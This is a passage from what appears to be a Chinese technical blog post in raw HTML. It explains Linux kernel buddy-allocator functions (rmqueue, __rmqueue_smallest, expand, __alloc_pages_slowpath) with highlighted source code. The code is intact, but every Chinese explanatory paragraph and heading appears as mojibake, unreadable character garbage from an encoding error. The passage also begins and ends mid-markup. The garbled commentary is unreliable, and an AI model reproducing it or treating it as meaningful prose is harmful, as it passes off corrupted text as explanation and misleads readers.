class="line">  get_pcppage_migratetype(page));</span><br><span class="line">spin_unlock_irqrestore(&amp;zone-&gt;lock, flags);</span><br><span class="line">&#125; <span class="keyword">while</span> (check_new_pages(page, order));</span><br><span class="line"></span><br><span class="line">__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="number">1</span> &lt;&lt; order);</span><br><span class="line">zone_statistics(preferred_zone, zone, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå›åˆ°<code>rmqueue</code>å‡½æ•°çš„æµç¨‹ï¼Œå¦‚æœç”³è¯·çš„<code>order</code>ä¸èƒ½ç›´æ¥é€šè¿‡pcpè¿›è¡Œç”³è¯·æ˜¯åˆ™ä¼šè¿›å…¥<code>rmqueue_buddy</code>å‡½æ•°ä¸­ã€‚å‡½æ•°å†…éƒ¨å…¶ä¼šæ ¹æ®ä¸åŒçš„<code>alloc_flags</code>é€šè¿‡ä¸åŒçš„å‡½æ•°è¿›è¡Œåˆ†é…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">rmqueue</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>, <span class="title">int</span> <span class="title">migratetype</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_CMA)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Balance movable allocations between regular and CMA areas by</span></span><br><span class="line"><span class="comment"> * allocating from CMA when over half of the zone&#x27;s free memory</span></span><br><span class="line"><span class="comment"> * is in the CMA area.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_CMA &amp;&amp;</span><br><span class="line">    zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;</span><br><span class="line">    zone_page_state(zone, NR_FREE_PAGES) / <span class="number">2</span>) &#123;</span><br><span class="line">page = __rmqueue_cma_fallback(zone, order);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">page = __rmqueue_smallest(zone, order, migratetype);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_CMA)</span><br><span class="line">page = __rmqueue_cma_fallback(zone, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,</span><br><span class="line">alloc_flags))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹<code>__rmqueue</code>å‡½æ•°ï¼Œå¯ä»¥å‘ç°å…¶å†…éƒ¨å®é™…è°ƒç”¨çš„è¿˜æ˜¯<code>__rmqueue_smallest</code>å‡½æ•°è¿›è¡Œåˆ†é…çš„ï¼Œä¸è¿‡å‰é¢ä¼šåˆ¤æ–­æ˜¯å¦åˆ†é…CMAï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥è°ƒç”¨<code>__rmqueue_cma_fallback</code>è¿›è¡Œåˆ†é…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_cma_fallback</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">return</span> __rmqueue_smallest(zone, order, MIGRATE_CMA);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_cma_fallback</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>) &#123;</span> <span class="keyword">return</span> <span class="literal">NULL</span>; &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>çœ‹å…¶å®šä¹‰å…¶å®ä¹Ÿåªæ˜¯ä¿®æ”¹äº†è¿ç§»ç±»å‹ä¹‹åè°ƒç”¨<code>__rmqueue_smallest</code>å‡½æ•°ï¼Œè€Œæ•´ä¸ª<code>buddy system</code>æœ€æ ¸å¿ƒçš„å‡½æ•°å°±æ˜¯<code>__rmqueue_smallest</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_smallest</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">migratetype</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> current_order;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> *<span class="title">area</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Find a page of the appropriate size in the preferred list */</span></span><br><span class="line"><span class="keyword">for</span> (current_order = order; current_order &lt;= MAX_ORDER; ++current_order) &#123;</span><br><span class="line">area = &amp;(zone-&gt;free_area[current_order]);</span><br><span class="line">page = get_page_from_free_area(area, migratetype);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">del_page_from_free_list(page, zone, current_order);</span><br><span class="line">expand(zone, page, order, current_order, migratetype);</span><br><span class="line">set_pcppage_migratetype(page, migratetype);</span><br><span class="line">trace_mm_page_alloc_zone_locked(page, order, migratetype,</span><br><span class="line">pcp_allowed_order(order) &amp;&amp;</span><br><span class="line">migratetype &lt; MIGRATE_PCPTYPES);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¸Œæœ›å„ä½è¿˜è®°å¾—åœ¨å‰æ–‡<code>struct zone</code>æ®µçš„å†…å®¹ï¼Œè¿™é‡Œç”¨æ–‡å­—ç»™å¤§å®¶ç®€è¦çš„å›å¿†ä¸€ä¸‹ï¼Œå¦‚æœè®°ä¸èµ·æ¥æœ€å¥½å¯ä»¥ç‚¹æ—è¾¹çš„å¤§çº²çœ‹çœ‹å›¾ç‰‡ã€‚åœ¨zoneä¸­å­˜åœ¨<code>free_area</code>å­—æ®µç”¨ä»¥å­˜å‚¨<code>buddy system</code>æŒ‰ç…§ order ç®¡ç†çš„é¡µé¢ï¼Œä¸ºä¸€ä¸ª <code>free_area</code> ç»“æ„ä½“æ•°ç»„ï¼Œè€Œå…¶ç´¢å¼•å°±æ˜¯é¡µæ‰€å¯¹åº”çš„<code>order</code>ã€‚å¹¶ä¸”<code>free_area</code>æœ¬èº«å°±æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œå†…éƒ¨å­˜åœ¨ä¸€ä¸ª<code>free_list</code>æˆå‘˜å…¶ç´¢å¼•å¯¹åº”çš„æ˜¯ä¸åŒçš„è¿ç§»ç±»å‹ã€‚</p><p>åœ¨ç»è¿‡ç®€å•çš„å›å¿†ä¹‹åæˆ‘ä»¬ç»§ç»­çœ‹<code>__rmqueue_smallest</code>å‡½æ•°ï¼Œè¿™é‡Œä¼šä»ä¼ å…¥çš„<code>order</code>å¼€å§‹è¿›è¡Œå¾ªç¯ï¼Œå¹¶ä¸”é€šè¿‡<code>order</code>åœ¨zoneä¸­æ‰¾åˆ°å¯¹åº”çš„<code>free_area</code>ï¼Œéšåé€šè¿‡è¿ç§»ç±»å‹è·å–åˆ°å¯¹åº”çš„é¡µã€‚åœ¨è·å–åˆ°å¯¹åº”çš„é¡µä¹‹åå°±ä¼šè¿›è¡Œæ–­é“¾æ“ä½œï¼Œè¿™é‡Œé‡ç‚¹çœ‹ä¸€ä¸‹<code>expand</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">expand</span><span class="params">(struct zone *zone, struct page *page,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> low, <span class="keyword">int</span> high, <span class="keyword">int</span> migratetype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> size = <span class="number">1</span> &lt;&lt; high;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (high &gt; low) &#123;</span><br><span class="line">high--;</span><br><span class="line">size &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">VM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Mark as guard pages (or page), that will allow to</span></span><br><span class="line"><span class="comment"> * merge back to allocator when buddy will be freed.</span></span><br><span class="line"><span class="comment"> * Corresponding page table entries will not be touched,</span></span><br><span class="line"><span class="comment"> * pages will stay not present in virtual address space</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (set_page_guard(zone, &amp;page[size], high, migratetype))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">add_to_free_list(&amp;page[size], zone, high, migratetype);</span><br><span class="line">set_buddy_order(&amp;page[size], high);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å‘ç°<code>current_order</code>å¤§äºä¼ å…¥çš„<code>order</code>æ—¶ä¼šè¿›å…¥å¾ªç¯ï¼Œå¯¹å¤§çš„order-1éšåå°†sizeå‡åŠï¼Œéšåå°†ååŠæ®µå­˜å…¥åˆ°é“¾è¡¨ä¸­å¹¶è®¾ç½®æ–°çš„orderå³è¿™é‡Œçš„highï¼Œå‰åŠæ®µçš„pageç»§ç»­é‡å¤ä»¥ä¸Šæ“ä½œç›´åˆ°high == lowã€‚</p><h3 id="alloc-pages-slowpathå‡½æ•°"><a href="#alloc-pages-slowpathå‡½æ•°" class="headerlink" title="__alloc_pages_slowpathå‡½æ•°"></a>__alloc_pages_slowpathå‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">alloc_pages_slowpath</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> *<span class="title">ac</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">bool</span> can_direct_reclaim = gfp_mask &amp; __GFP_DIRECT_RECLAIM;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">bool</span> costly_order = order &gt; PAGE_ALLOC_COSTLY_ORDER;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> did_some_progress;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">compact_priority</span> <span class="title">compact_priority</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">compact_result</span> <span class="title">compact_result</span>;</span></span><br><span class="line"><span class="keyword">int</span> compaction_retries;</span><br><span class="line"><span class="keyword">int</span> no_progress_loops;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cpuset_mems_cookie;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> zonelist_iter_cookie;</span><br><span class="line"><span class="keyword">int</span> reserve_flags;</span><br><span class="line"></span><br><span class="line">restart:</span><br><span class="line">compaction_retries = <span class="number">0</span>;</span><br><span class="line">no_progress_loops = <span class="number">0</span>;</span><br><span class="line">compact_priority = DEF_COMPACT_PRIORITY;</span><br><span class="line">cpuset_mems_cookie = read_mems_allowed_begin();</span><br><span class="line">zonelist_iter_cookie = zonelist_iter_begin();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The fast path uses conservative alloc_flags to succeed only until</span></span><br><span class="line"><span class="comment"> * kswapd needs to be woken up, and to avoid the cost of setting up</span></span><br><span class="line"><span class="comment"> * alloc_flags precisely. So we do that now.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alloc_flags = gfp_to_alloc_flags(gfp_mask, order);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We need to recalculate the starting point for the zonelist iterator</span></span><br><span class="line"><span class="comment"> * because we might have used different nodemask in the fast path, or</span></span><br><span class="line"><span class="comment"> * there was a cpuset modification and we are retrying - otherwise we</span></span><br><span class="line"><span class="comment"> * could end up iterating over non-eligible zones endlessly.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line"><span class="keyword">if</span> (!ac-&gt;preferred_zoneref-&gt;zone)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check for insane configurations where the cpuset doesn&#x27;t contain</span></span><br><span class="line"><span class="comment"> * any suitable zone to satisfy the request - e.g. non-movable</span></span><br><span class="line"><span class="comment"> * GFP_HIGHUSER allocations from MOVABLE nodes only.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (cpusets_insane_config() &amp;&amp; (gfp_mask &amp; __GFP_HARDWALL)) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">z</span> =</span> first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx,</span><br><span class="line">&amp;cpuset_current_mems_allowed);</span><br><span class="line"><span class="keyword">if</span> (!z-&gt;zone)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)</span><br><span class="line">wake_all_kswapds(order, gfp_mask, ac);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The adjusted alloc_flags might result in immediate success, so try</span></span><br><span class="line"><span class="comment"> * that first</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For costly allocations, try direct compaction first, as it&#x27;s likely</span></span><br><span class="line"><span class="comment"> * that we have enough base pages and don&#x27;t need to reclaim. For non-</span></span><br><span class="line"><span class="comment"> * movable high-order allocations, do that as well, as compaction will</span></span><br><span class="line"><span class="comment"> * try prevent permanent fragmentation by migrating from blocks of the</span></span><br><span class="line"><span class="comment"> * same migratetype.</span></span><br><span class="line"><span class="comment"> * Don&#x27;t try this for allocations that are allowed to ignore</span></span><br><span class="line"><span class="comment"> * watermarks, as the ALLOC_NO_WATERMARKS attempt didn&#x27;t yet happen.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (can_direct_reclaim &amp;&amp;</span><br><span class="line">(costly_order ||</span><br><span class="line">   (order &gt; <span class="number">0</span> &amp;&amp; ac-&gt;migratetype != MIGRATE_MOVABLE))</span><br><span class="line">&amp;&amp; !gfp_pfmemalloc_allowed(gfp_mask)) &#123;</span><br><span class="line">page = __alloc_pages_direct_compact(gfp_mask, order,</span><br><span class="line">alloc_flags, ac,</span><br><span class="line">INIT_COMPACT_PRIORITY,</span><br><span class="line">&amp;compact_result);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Checks for costly allocations with __GFP_NORETRY, which</span></span><br><span class="line"><span class="comment"> * includes some THP page fault allocations</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (costly_order &amp;&amp; (gfp_mask &amp; __GFP_NORETRY)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If allocating entire pageblock(s) and compaction</span></span><br><span class="line"><span class="comment"> * failed because all zones are below low watermarks</span></span><br><span class="line"><span class="comment"> * or is prohibited because it recently failed at this</span></span><br><span class="line"><span class="comment"> * order, fail immediately unless the allocator has</span></span><br><span class="line"><span class="comment"> * requested compaction and reclaim retry.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Reclaim is</span></span><br><span class="line"><span class="comment"> *  - potentially very expensive because zones are far</span></span><br><span class="line"><span class="comment"> *    below their low watermarks or this is part of very</span></span><br><span class="line"><span class="comment"> *    bursty high order allocations,</span></span><br><span class="line"><span class="comment"> *  - not guaranteed to help because isolate_freepages()</span></span><br><span class="line"><span class="comment"> *    may not iterate over freed pages as part of its</span></span><br><span class="line"><span class="comment"> *    linear scan, and</span></span><br><span class="line"><span class="comment"> *  - unlikely to make entire pageblocks free on its</span></span><br><span class="line"><span class="comment"> *    own.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (compact_result == COMPACT_SKIPPED ||</span><br><span class="line">    compact_result == COMPACT_DEFERRED)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Looks like reclaim/compaction is worth trying, but</span></span><br><span class="line"><span class="comment"> * sync compaction could be very expensive, so keep</span></span><br><span class="line"><span class="comment"> * using async compaction.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">compact_priority = INIT_COMPACT_PRIORITY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/* Ensure kswapd doesn&#x27;t accidentally go to sleep as long as we loop */</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)</span><br><span class="line">wake_all_kswapds(order, gfp_mask, ac);</span><br><span class="line"></span><br><span class="line">reserve_flags = __gfp_pfmemalloc_flags(gfp_mask);</span><br><span class="line"><span class="keyword">if</span> (reserve_flags)</span><br><span class="line">alloc_flags = gfp_to_alloc_flags_cma(gfp_mask, reserve_flags) |</span><br><span class="line">  (alloc_flags &amp; ALLOC_KSWAPD);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Reset the nodemask and zonelist iterators if memory policies can be</span></span><br><span class="line"><span class="comment"> * ignored. These allocations are high priority and system rather than</span></span><br><span class="line"><span class="comment"> * user oriented.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!(alloc_flags &amp; ALLOC_CPUSET) || reserve_flags) &#123;</span><br><span class="line">ac-&gt;nodemask = <span class="literal">NULL</span>;</span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Attempt with potentially adjusted zonelist and alloc_flags */</span></span><br><span class="line">page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller is not willing to reclaim, we can&#x27;t balance anything */</span></span><br><span class="line"><span class="keyword">if</span> (!can_direct_reclaim)</span><br><span class="line"><span 